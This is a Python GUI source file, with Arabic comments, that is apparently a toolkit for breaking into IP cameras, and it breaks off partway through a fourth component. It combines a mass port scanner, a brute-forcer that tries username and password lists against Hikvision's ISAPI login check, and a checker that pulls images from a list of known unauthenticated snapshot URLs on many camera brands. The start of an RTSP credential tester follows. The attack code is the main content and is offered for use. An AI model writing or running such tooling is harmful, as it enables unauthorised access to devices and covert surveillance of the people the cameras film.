import customtkinter as ctk
import tkinter as tk
from tkinter import filedialog, messagebox
import queue
import threading
import time
import os
from PIL import Image, ImageTk
import concurrent.futures
import socket
import ipaddress
import requests
import base64
import hashlib
import subprocess
import re
import sys
import random
import string

# إعدادات الثيم
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# قوائم انتظار لإدخال البيانات
request_queue = queue.Queue()
response_queue = queue.Queue()

# مسار الصورة (يجب استبداله بالمسار الفعلي)
IMAGE_PATH = "pd.jpg"  # مثال: "C:/path/to/your/image.png"

class IPScanner:
    def __init__(self):
        self.closed_count = 0
        self.current_ip_range = None
        self.open_count = 0
        self.ports = []
        self.results_queue = queue.Queue()
        self.scan_active = False
        self.start_time = time.time()
        self.timeout_count = 0
        self.total_checked = 0
        self.gui_frame = None
        self.progress_bar = None
        self.ip_file = None
        self.ports_file = None

    def set_gui(self, frame):
        self.gui_frame = frame
        self.create_gui_elements()

    def create_gui_elements(self):
        input_frame, text_frame, button_frame = self.configure_tab_gui()
        
        ctk.CTkLabel(input_frame, text="Number of Threads:", text_color="red").grid(row=0, column=0, pady=5, sticky="w")
        self.worker_entry = ctk.CTkEntry(input_frame, text_color="red", fg_color="black", border_color="red")
        self.worker_entry.grid(row=0, column=1, pady=5, sticky="ew")
        self.worker_entry.insert(0, "100")

        ctk.CTkButton(input_frame, text="Load IP File", command=self.load_ip_file, fg_color="red", hover_color="darkred").grid(row=1, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load Ports File", command=self.load_ports_file, fg_color="red", hover_color="darkred").grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")

        self.current_range_label = ctk.CTkLabel(input_frame, text="Current IP Range: ", text_color="yellow")
        self.current_range_label.grid(row=3, column=0, columnspan=2, pady=2, sticky="w")
        self.ports_label = ctk.CTkLabel(input_frame, text="Your Ports: ", text_color="cyan")
        self.ports_label.grid(row=4, column=0, columnspan=2, pady=2, sticky="w")
        self.elapsed_label = ctk.CTkLabel(input_frame, text="Elapsed Time: 0.00 seconds", text_color="cyan")
        self.elapsed_label.grid(row=5, column=0, columnspan=2, pady=2, sticky="w")
        self.rate_label = ctk.CTkLabel(input_frame, text="Scan Rate: 0.00 checks/second", text_color="cyan")
        self.rate_label.grid(row=6, column=0, columnspan=2, pady=2, sticky="w")
        self.timeout_label = ctk.CTkLabel(input_frame, text="Timeout: 0", text_color="yellow")
        self.timeout_label.grid(row=7, column=0, columnspan=2, pady=2, sticky="w")
        self.closed_label = ctk.CTkLabel(input_frame, text="Closed: 0", text_color="red")
        self.closed_label.grid(row=8, column=0, columnspan=2, pady=2, sticky="w")
        self.open_label = ctk.CTkLabel(input_frame, text="Open: 0", text_color="green")
        self.open_label.grid(row=9, column=0, columnspan=2, pady=2, sticky="w")
        self.total_label = ctk.CTkLabel(input_frame, text="Total Checked: 0", text_color="cyan")
        self.total_label.grid(row=10, column=0, columnspan=2, pady=2, sticky="w")

        self.progress_bar = ctk.CTkProgressBar(input_frame, fg_color="red", progress_color="darkred")
        self.progress_bar.grid(row=11, column=0, columnspan=2, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.log_text = ctk.CTkTextbox(text_frame, fg_color="black", text_color="red", height=200)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        scrollbar = ctk.CTkScrollbar(text_frame, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.configure(yscrollcommand=scrollbar.set)

        ctk.CTkButton(button_frame, text="Start Scan", command=self.start_scan, fg_color="red", hover_color="darkred").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(button_frame, text="Stop Scan", command=self.stop_scan, fg_color="red", hover_color="darkred").grid(row=0, column=1, padx=5, pady=5, sticky="ew")

    def configure_tab_gui(self):
        self.gui_frame.configure(fg_color="black")
        self.gui_frame.grid_columnconfigure(0, weight=1)
        self.gui_frame.grid_rowconfigure(0, weight=0)
        self.gui_frame.grid_rowconfigure(1, weight=1)
        self.gui_frame.grid_rowconfigure(2, weight=0)

        input_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        input_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        input_frame.grid_columnconfigure(0, weight=0)
        input_frame.grid_columnconfigure(1, weight=1)

        text_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        text_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        text_frame.grid_columnconfigure(0, weight=1)
        text_frame.grid_rowconfigure(0, weight=1)

        button_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        button_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        return input_frame, text_frame, button_frame

    def gui_log(self, message, tag="red"):
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")

    def load_ip_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.ip_file = file
            self.gui_log(f"Loaded IP file: {file}", "cyan")

    def load_ports_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.ports_file = file
            self.gui_log(f"Loaded Ports file: {file}", "cyan")

    def parse_ip_ranges(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def parse_ports(self, filename):
        try:
            with open(filename, 'r') as f:
                return [int(p.strip()) for p in f if p.strip()]
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def generate_ips_from_range(self, ip_range):
        try:
            start_ip, end_ip = ip_range.split('-')
            start_ip = ipaddress.IPv4Address(start_ip.strip())
            end_ip = ipaddress.IPv4Address(end_ip.strip())
            current_ip = start_ip
            while current_ip <= end_ip:
                yield str(current_ip)
                current_ip += 1
        except ValueError:
            self.gui_log(f"Invalid IP range format: {ip_range}", "red")
            return

    def check_port(self, ip, port, timeout=2):
        if not self.scan_active:
            return
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                result = s.connect_ex((ip, port))
                if result == 0:
                    self.results_queue.put((ip, port, True))
                else:
                    self.results_queue.put((ip, port, False))
        except socket.timeout:
            self.results_queue.put((ip, port, None))
        except Exception as e:
            self.results_queue.put((ip, port, None))
            self.gui_log(f"Error checking {ip}:{port}: {str(e)}", "red")

    def update_display(self):
        current_time = time.time()
        elapsed = current_time - self.start_time
        rate = self.total_checked / elapsed if elapsed > 0 else 0
        self.current_range_label.configure(text=f"Current IP Range: {self.current_ip_range or ''}")
        self.ports_label.configure(text=f"Your Ports: {', '.join(map(str, self.ports))}")
        self.elapsed_label.configure(text=f"Elapsed Time: {elapsed:.2f} seconds")
        self.rate_label.configure(text=f"Scan Rate: {rate:.2f} checks/second")
        self.timeout_label.configure(text=f"Timeout: {self.timeout_count}")
        self.closed_label.configure(text=f"Closed: {self.closed_count}")
        self.open_label.configure(text=f"Open: {self.open_count}")
        self.total_label.configure(text=f"Total Checked: {self.total_checked}")

    def save_result(self, ip, port):
        with open('ip.txt', 'a') as f:
            f.write(f'{ip}:{port}\n')

    def process_results(self):
        while self.results_queue.qsize() > 0:
            ip, port, status = self.results_queue.get()
            self.total_checked += 1
            if status is True:
                self.open_count += 1
                self.save_result(ip, port)
                self.gui_log(f"Open port found: {ip}:{port}", "green")
            elif status is False:
                self.closed_count += 1
            else:
                self.timeout_count += 1

    def scan_range(self, ip_range, ports, max_workers):
        self.current_ip_range = ip_range
        ips = list(self.generate_ips_from_range(ip_range))
        if not ips:
            return False
        total_tasks = len(ips) * len(ports)
        self.gui_log(f"Starting scan for range: {ip_range} ({len(ips)} IPs)", "cyan")
        self.gui_log(f"Using {max_workers} workers", "magenta")

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for ip in ips:
                for port in ports:
                    futures.append(executor.submit(self.check_port, ip, port))
            last_display_update = time.time()
            completed_tasks = 0
            while futures:
                current_time = time.time()
                self.process_results()
                if current_time - last_display_update >= 1:
                    self.update_display()
                    completed_tasks = sum(1 for f in futures if f.done())
                    self.progress_bar.set(completed_tasks / total_tasks)
                    last_display_update = current_time
                if all(f.done() for f in futures):
                    break
                time.sleep(0.1)
        self.process_results()
        self.update_display()
        self.progress_bar.set(1.0)
        return True

    def start_scan(self):
        try:
            max_workers = int(self.worker_entry.get())
            if not (1 <= max_workers <= 500):
                messagebox.showerror("Error", "Threads must be between 1 and 500")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid number of threads")
            return

        if not hasattr(self, 'ip_file') or not hasattr(self, 'ports_file'):
            messagebox.showerror("Error", "Please load IP and Ports files")
            return

        self.scan_active = True
        self.ports = self.parse_ports(self.ports_file)
        threading.Thread(target=self.run_scan, args=(max_workers,), daemon=True).start()

    def run_scan(self, max_workers):
        for ip_range in self.parse_ip_ranges(self.ip_file):
            if not self.scan_active:
                break
            success = self.scan_range(ip_range, self.ports, max_workers)
            if success:
                self.gui_log(f"Finished scanning range: {ip_range}", "green")
                self.gui_log("Moving to next range...", "cyan")
        self.gui_log("All ranges scanned!", "green")
        self.gui_log("Results saved to ip.txt", "cyan")

    def stop_scan(self):
        self.scan_active = False
        self.gui_log("Scan stopped by user", "yellow")

class OldHikvisionCracker:
    def __init__(self):
        self.user_file = 'userlist.txt'
        self.pass_file = 'passlist.txt'
        self.ip_file = 'ip.txt'
        self.output_file = 'success.txt'
        self.timeout = 2
        self.max_timeout_attempts = 3
        self.usernames = []
        self.passwords = []
        self.ip_addresses = []
        self.state = self.State()
        self.gui_frame = None
        self.progress_bar = None

    class State:
        def __init__(self):
            self.lock = threading.Lock()
            self.tested = 0
            self.success = 0
            self.failed = 0
            self.timeout = 0
            self.start_time = time.time()
            self.ip_timeout_counts = {}
            self.blacklisted_ips = set()
            self.found_credentials = []

    def set_gui(self, frame):
        self.gui_frame = frame
        self.create_gui_elements()

    def create_gui_elements(self):
        input_frame, text_frame, button_frame = self.configure_tab_gui()
        
        ctk.CTkLabel(input_frame, text="Number of Concurrent IPs:", text_color="red").grid(row=0, column=0, pady=5, sticky="w")
        self.concurrent_entry = ctk.CTkEntry(input_frame, text_color="red", fg_color="black", border_color="red")
        self.concurrent_entry.grid(row=0, column=1, pady=5, sticky="ew")
        self.concurrent_entry.insert(0, "10")

        ctk.CTkButton(input_frame, text="Load IP File", command=self.load_ip_file, fg_color="red", hover_color="darkred").grid(row=1, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load User File", command=self.load_user_file, fg_color="red", hover_color="darkred").grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load Password File", command=self.load_pass_file, fg_color="red", hover_color="darkred").grid(row=3, column=0, columnspan=2, pady=5, sticky="ew")

        self.progress_label = ctk.CTkLabel(input_frame, text="Progress: 0/0", text_color="blue")
        self.progress_label.grid(row=4, column=0, columnspan=2, pady=2, sticky="w")
        self.failed_label = ctk.CTkLabel(input_frame, text="Failed: 0", text_color="red")
        self.failed_label.grid(row=5, column=0, columnspan=2, pady=2, sticky="w")
        self.timeout_label = ctk.CTkLabel(input_frame, text="Timeout: 0", text_color="yellow")
        self.timeout_label.grid(row=6, column=0, columnspan=2, pady=2, sticky="w")
        self.success_label = ctk.CTkLabel(input_frame, text="Success: 0", text_color="green")
        self.success_label.grid(row=7, column=0, columnspan=2, pady=2, sticky="w")
        self.blacklisted_label = ctk.CTkLabel(input_frame, text="Blacklisted IPs: 0", text_color="red")
        self.blacklisted_label.grid(row=8, column=0, columnspan=2, pady=2, sticky="w")

        self.progress_bar = ctk.CTkProgressBar(input_frame, fg_color="red", progress_color="darkred")
        self.progress_bar.grid(row=9, column=0, columnspan=2, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.log_text = ctk.CTkTextbox(text_frame, fg_color="black", text_color="red", height=200)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        scrollbar = ctk.CTkScrollbar(text_frame, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.configure(yscrollcommand=scrollbar.set)

        ctk.CTkButton(button_frame, text="Start Attack", command=self.start_attack, fg_color="red", hover_color="darkred").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(button_frame, text="Stop Attack", command=self.stop_attack, fg_color="red", hover_color="darkred").grid(row=0, column=1, padx=5, pady=5, sticky="ew")

    def configure_tab_gui(self):
        self.gui_frame.configure(fg_color="black")
        self.gui_frame.grid_columnconfigure(0, weight=1)
        self.gui_frame.grid_rowconfigure(0, weight=0)
        self.gui_frame.grid_rowconfigure(1, weight=1)
        self.gui_frame.grid_rowconfigure(2, weight=0)

        input_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        input_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        input_frame.grid_columnconfigure(0, weight=0)
        input_frame.grid_columnconfigure(1, weight=1)

        text_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        text_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        text_frame.grid_columnconfigure(0, weight=1)
        text_frame.grid_rowconfigure(0, weight=1)

        button_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        button_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        return input_frame, text_frame, button_frame

    def gui_log(self, message, tag="red"):
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")

    def load_ip_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.ip_file = file
            self.gui_log(f"Loaded IP file: {file}", "cyan")

    def load_user_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.user_file = file
            self.gui_log(f"Loaded User file: {file}", "cyan")

    def load_pass_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.pass_file = file
            self.gui_log(f"Loaded Password file: {file}", "cyan")

    def read_lines(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def read_ips(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                ips = []
                for line in f:
                    line = line.strip()
                    if line:
                        if ':' in line:
                            ip, port = line.split(':')
                        else:
                            ip = line
                            port = '80'
                        ips.append((ip, port))
                return ips
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def update_stats(self):
        total_combinations = len(self.ip_addresses) * len(self.usernames) * len(self.passwords)
        self.progress_label.configure(text=f"Progress: {self.state.tested}/{total_combinations}")
        self.failed_label.configure(text=f"Failed: {self.state.failed}")
        self.timeout_label.configure(text=f"Timeout: {self.state.timeout}")
        self.success_label.configure(text=f"Success: {self.state.success}")
        self.blacklisted_label.configure(text=f"Blacklisted IPs: {len(self.state.blacklisted_ips)}")
        self.progress_bar.set(self.state.tested / total_combinations if total_combinations > 0 else 0)

    def save_success(self, ip, port, username, password):
        with open(self.output_file, 'a') as f:
            f.write(f'oldhik#{ip}#{port}#{username}#{password}\n')

    def process_ip(self, ip_port):
        ip, port = ip_port
        for username in self.usernames:
            for password in self.passwords:
                if ip in self.state.blacklisted_ips:
                    with self.state.lock:
                        self.state.tested += 1
                    return None
                time_stamp = str(int(time.time() * 1000))
                url = f'http://{username}:{password}@{ip}:{port}/ISAPI/Security/userCheck?timeStamp={time_stamp}'
                headers = {'User-Agent': 'Mozilla/5.0'}
                try:
                    response = requests.get(url, headers=headers, timeout=self.timeout)
                    if response.status_code == 200 and '<statusValue>200</statusValue>' in response.text:
                        with self.state.lock:
                            self.state.success += 1
                            self.state.tested += 1
                            self.state.found_credentials.append((ip, port, username, password))
                            self.save_success(ip, port, username, password)
                        self.gui_log(f"[+] Found: {ip}:{port} | {username}:{password}", "green")
                        return True
                    else:
                        with self.state.lock:
                            self.state.failed += 1
                            self.state.tested += 1
                except requests.exceptions.Timeout:
                    with self.state.lock:
                        self.state.timeout += 1
                        self.state.tested += 1
                        self.state.ip_timeout_counts[ip] = self.state.ip_timeout_counts.get(ip, 0) + 1
                        if self.state.ip_timeout_counts[ip] >= self.max_timeout_attempts:
                            self.state.blacklisted_ips.add(ip)
                            self.gui_log(f"[-] Blacklisted {ip} (timeout)", "yellow")
                except requests.exceptions.RequestException as e:
                    with self.state.lock:
                        self.state.failed += 1
                        self.state.tested += 1
                    self.gui_log(f"Error processing {ip}:{port}: {str(e)}", "red")
                self.update_stats()
        return 'retry'

    def worker(self, ip_queue):
        while True:
            ip_port = ip_queue.get()
            if ip_port is None:
                return
            result = self.process_ip(ip_port)
            if result == 'retry':
                ip_queue.put(ip_port)
            ip_queue.task_done()

    def start_attack(self):
        try:
            concurrent_ips = int(self.concurrent_entry.get())
            if not (1 <= concurrent_ips <= 50):
                messagebox.showerror("Error", "Concurrent IPs must be between 1 and 50")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid number of concurrent IPs")
            return

        if not hasattr(self, 'ip_file') or not hasattr(self, 'user_file') or not hasattr(self, 'pass_file'):
            messagebox.showerror("Error", "Please load IP, User, and Password files")
            return

        self.usernames = self.read_lines(self.user_file)
        self.passwords = self.read_lines(self.pass_file)
        self.ip_addresses = self.read_ips(self.ip_file)
        if not all([self.usernames, self.passwords, self.ip_addresses]):
            messagebox.showerror("Error", "One or more input files are empty")
            return

        total_combinations = len(self.ip_addresses) * len(self.usernames) * len(self.passwords)
        self.gui_log(f"Starting attack on {len(self.ip_addresses)} cameras ({total_combinations} combinations)", "blue")
        self.gui_log(f"IPs with {self.max_timeout_attempts} timeouts will be blacklisted", "yellow")

        threading.Thread(target=self.run_attack, args=(concurrent_ips,), daemon=True).start()

    def run_attack(self, concurrent_ips):
        ip_queue = queue.Queue()
        for ip_port in self.ip_addresses:
            ip_queue.put(ip_port)
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_ips) as executor:
            workers = [executor.submit(self.worker, ip_queue) for _ in range(concurrent_ips)]
            while not ip_queue.empty():
                self.update_stats()
                time.sleep(0.1)
            ip_queue.join()
            for _ in range(concurrent_ips):
                ip_queue.put(None)
        self.update_stats()
        self.gui_log(f"Valid credentials saved to {self.output_file}", "green")

    def stop_attack(self):
        self.gui_log("Attack stopped by user", "yellow")

class VulnerableCameraChecker:
    def __init__(self):
        self.paths = ['/mjpg/video.mjpg', '/-wvhttp-01-/GetOneShot?image_size=640x480&frame_count=1000000000', '/webcapture.jpg?command=snap&channel=1?COUNTER', '/cgi-bin/faststream.jpg?stream=half&fps=15&rand=COUNTER', '/cgi-bin/camera?resolution=640&quality=1&Language=0&COUNTER', '/cgi-bin/viewer/video.jpg?r=COUNTER', '/snap.jpg?JpegSize=M&JpegCam=1&r=COUNTER', '/nph-jpeg.cgi?0', '/jpg/image.jpg?COUNTER', '/SnapshotJPEG?Resolution=640x480&Quality=Clarity&COUNTER', '/cgi-bin/snapshot.cgi?COUNTER', '/jpgmulreq/1/image.jpg?key=1516975535684&lq=1&1748745807', '/cgi-bin/viewer/video.jpg?r=1748748941', '/cam_1.cgi', '/onvif-http/snapshot?auth=YWRtaW46MTEK']
        self.file_lock = threading.Lock()
        self.gui_frame = None
        self.progress_bar = None
        self.ip_file = None
        self.scan_active = False

    def set_gui(self, frame):
        self.gui_frame = frame
        self.create_gui_elements()

    def create_gui_elements(self):
        input_frame, text_frame, button_frame = self.configure_tab_gui()
        
        ctk.CTkLabel(input_frame, text="Number of Threads:", text_color="red").grid(row=0, column=0, pady=5, sticky="w")
        self.worker_entry = ctk.CTkEntry(input_frame, text_color="red", fg_color="black", border_color="red")
        self.worker_entry.grid(row=0, column=1, pady=5, sticky="ew")
        self.worker_entry.insert(0, "100")

        ctk.CTkButton(input_frame, text="Load IP File", command=self.load_ip_file, fg_color="red", hover_color="darkred").grid(row=1, column=0, columnspan=2, pady=5, sticky="ew")

        self.progress_bar = ctk.CTkProgressBar(input_frame, fg_color="red", progress_color="darkred")
        self.progress_bar.grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.log_text = ctk.CTkTextbox(text_frame, fg_color="black", text_color="red", height=200)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        scrollbar = ctk.CTkScrollbar(text_frame, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.configure(yscrollcommand=scrollbar.set)

        ctk.CTkButton(button_frame, text="Start Scan", command=self.start_scan, fg_color="red", hover_color="darkred").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(button_frame, text="Stop Scan", command=self.stop_scan, fg_color="red", hover_color="darkred").grid(row=0, column=1, padx=5, pady=5, sticky="ew")

    def configure_tab_gui(self):
        self.gui_frame.configure(fg_color="black")
        self.gui_frame.grid_columnconfigure(0, weight=1)
        self.gui_frame.grid_rowconfigure(0, weight=0)
        self.gui_frame.grid_rowconfigure(1, weight=1)
        self.gui_frame.grid_rowconfigure(2, weight=0)

        input_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        input_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        input_frame.grid_columnconfigure(0, weight=0)
        input_frame.grid_columnconfigure(1, weight=1)

        text_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        text_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        text_frame.grid_columnconfigure(0, weight=1)
        text_frame.grid_rowconfigure(0, weight=1)

        button_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        button_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        return input_frame, text_frame, button_frame

    def gui_log(self, message, tag="red"):
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")

    def load_ip_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.ip_file = file
            self.gui_log(f"Loaded IP file: {file}", "cyan")

    def create_download_folder(self):
        if not os.path.exists('download-images'):
            os.makedirs('download-images')

    def generate_random_suffix(self, length=4):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def get_unique_filename(self, ip_port, path):
        sanitized_path = path.replace('/', '_').replace('?', '_').replace('=', '_').replace('&', '_')
        base_name = ip_port.replace(':', '-') + '_' + sanitized_path
        filename = base_name + '.jpg'
        filepath = os.path.join('download-images', filename)
        while os.path.exists(filepath):
            random_suffix = self.generate_random_suffix()
            filename = base_name + '-' + random_suffix + '.jpg'
            filepath = os.path.join('download-images', filename)
        return filepath

    def download_image(self, url, ip_port, path):
        try:
            response = requests.get(url, stream=True, timeout=2)
            if response.status_code == 200:
                filepath = self.get_unique_filename(ip_port, path)
                with open(filepath, 'wb') as f:
                    for chunk in response.iter_content(1024):
                        f.write(chunk)
                return True, filepath
            return False, None
        except Exception as e:
            self.gui_log(f"Error downloading {url}: {str(e)}", "red")
            return False, None

    def check_camera(self, ip_port, path):
        try:
            if ':' in ip_port:
                ip, port = ip_port.split(':')
                port = int(port)
            else:
                ip = ip_port
                port = 80
            url = f'http://{ip}:{port}{path}'
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and 'image' in response.headers.get('Content-Type', ''):
                    success, filepath = self.download_image(url, ip_port, path)
                    if success:
                        return True, url, ip_port, 'success', filepath
                    else:
                        return True, url, ip_port, 'download_failed', None
            except requests.exceptions.Timeout:
                return False, url, ip_port, 'timeout', None
            except requests.exceptions.RequestException:
                return False, url, ip_port, 'not_found', None
            return False, url, ip_port, 'not_found', None
        except Exception as e:
            return False, None, ip_port, 'error', None

    def save_result(self, url, status):
        with self.file_lock:
            with open('success.txt', 'a') as f:
                f.write(f'vulnerability#{url}\n')

    def process_ip(self, ip_port):
        results = []
        for path in self.paths:
            if not self.scan_active:
                break
            found, url, current_ip_port, status, filepath = self.check_camera(ip_port, path)
            if status == 'timeout':
                self.gui_log(f"[TIMEOUT] {url}", "yellow")
            elif status == 'not_found':
                self.gui_log(f"[NOT FOUND] {url}", "red")
            elif status == 'download_failed':
                self.gui_log(f"[DOWNLOAD FAILED] {url}", "magenta")
                self.save_result(url, 'DOWNLOAD_FAILED')
                results.append((url, 'DOWNLOAD_FAILED'))
            elif status == 'success':
                self.gui_log(f"[FOUND] {url}", "green")
                self.gui_log(f"[DOWNLOADED] Saved to: {filepath}", "cyan")
                self.save_result(url, 'SUCCESS')
                results.append((url, filepath))
        return ip_port, results

    def start_scan(self):
        try:
            max_workers = int(self.worker_entry.get())
            if not (1 <= max_workers <= 500):
                messagebox.showerror("Error", "Threads must be between 1 and 500")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid number of threads")
            return

        if not hasattr(self, 'ip_file'):
            messagebox.showerror("Error", "Please load IP file")
            return

        self.scan_active = True
        threading.Thread(target=self.run_scan, args=(max_workers,), daemon=True).start()

    def run_scan(self, max_workers):
        self.create_download_folder()
        with open('success.txt', 'a') as f:
            pass
        with open(self.ip_file, 'r') as f:
            ip_list = [line.strip() for line in f if line.strip()]
        self.gui_log(f"Starting scan for {len(ip_list)} IP addresses...", "cyan")
        self.gui_log(f"Scanning {len(self.paths)} paths per IP...", "cyan")
        self.gui_log(f"Using {max_workers} workers...", "magenta")

        total_tasks = len(ip_list) * len(self.paths)
        completed_tasks = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_ip = {executor.submit(self.process_ip, ip): ip for ip in ip_list}
            for future in concurrent.futures.as_completed(future_to_ip):
                if not self.scan_active:
                    break
                ip_port, results = future.result()
                completed_tasks += len(self.paths)
                self.progress_bar.set(completed_tasks / total_tasks)
                if results:
                    self.gui_log(f"Completed scan for {ip_port} - found {len(results)} cameras", "cyan")
        self.gui_log("Scan completed.", "cyan")
        self.gui_log("Results saved to success.txt", "cyan")
        self.gui_log("Images saved to download-images folder", "cyan")

    def stop_scan(self):
        self.scan_active = False
        self.gui_log("Scan stopped by user", "yellow")

class RTSPTester:
    def __init__(self, timeout=2):
        self.timeout = timeout
        self.methods = [self.method_socket_basic, self.method_socket_digest, self.method_requests, self.method_ffmpeg]
        self.stats = {'total': 0, 'success': 0, 'timeout': 0, 'failed': 0, 'start_time': time.time()}
        self.lock = threading.Lock()
        self.result_queue = queue.Queue()
        self.success_file = 'success.txt'
        self.successful_ips = set()
        self.gui_frame = None
        self.progress_bar = None
        self.ip_file = None
        self.user_file = None
        self.pass_file = None
        self.scan_active = False

    def set_gui(self, frame):
        self.gui_frame = frame
        self.create_gui_elements()

    def create_gui_elements(self):
        input_frame, text_frame, button_frame = self.configure_tab_gui()
        
        ctk.CTkLabel(input_frame, text="Number of Threads:", text_color="red").grid(row=0, column=0, pady=5, sticky="w")
        self.worker_entry = ctk.CTkEntry(input_frame, text_color="red", fg_color="black", border_color="red")
        self.worker_entry.grid(row=0, column=1, pady=5, sticky="ew")
        self.worker_entry.insert(0, "100")

        ctk.CTkButton(input_frame, text="Load IP File", command=self.load_ip_file, fg_color="red", hover_color="darkred").grid(row=1, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load User File", command=self.load_user_file, fg_color="red", hover_color="darkred").grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load Password File", command=self.load_pass_file, fg_color="red", hover_color="darkred").grid(row=3, column=0, columnspan=2, pady=5, sticky="ew")

        self.stats_label = ctk.CTkLabel(input_frame, text="", text_color="cyan")
        self.stats_label.grid(row=4, column=0, columnspan=2, pady=2, sticky="w")

        self.progress_bar = ctk.CTkProgressBar(input_frame, fg_color="red", progress_color="darkred")
        self.progress_bar.grid(row=5, column=0, columnspan=2, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.log_text = ctk.CTkTextbox(text_frame, fg_color="black", text_color="red", height=200)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        scrollbar = ctk.CTkScrollbar(text_frame, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.configure(yscrollcommand=scrollbar.set)

        ctk.CTkButton(button_frame, text="Start Scan", command=self.start_scan, fg_color="red", hover_color="darkred").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(button_frame, text="Stop Scan", command=self.stop_scan, fg_color="red", hover_color="darkred").grid(row=0, column=1, padx=5, pady=5, sticky="ew")

    def configure_tab_gui(self):
        self.gui_frame.configure(fg_color="black")
        self.gui_frame.grid_columnconfigure(0, weight=1)
        self.gui_frame.grid_rowconfigure(0, weight=0)
        self.gui_frame.grid_rowconfigure(1, weight=1)
        self.gui_frame.grid_rowconfigure(2, weight=0)

        input_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        input_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        input_frame.grid_columnconfigure(0, weight=0)
        input_frame.grid_columnconfigure(1, weight=1)

        text_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        text_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        text_frame.grid_columnconfigure(0, weight=1)
        text_frame.grid_rowconfigure(0, weight=1)

        button_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        button_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        return input_frame, text_frame, button_frame

    def gui_log(self, message, tag="red"):
